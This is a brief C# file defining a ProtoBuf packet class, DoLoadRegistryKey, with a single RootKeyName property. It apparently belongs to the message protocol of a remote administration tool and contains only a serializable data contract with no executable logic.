using ProtoBuf;

namespace Quasar.Common.Packets
{
    [ProtoContract]
    public class DoLoadRegistryKey : IPacket
    {
        [ProtoMember(1)]
        public string RootKeyName { get; set; }
    }
}
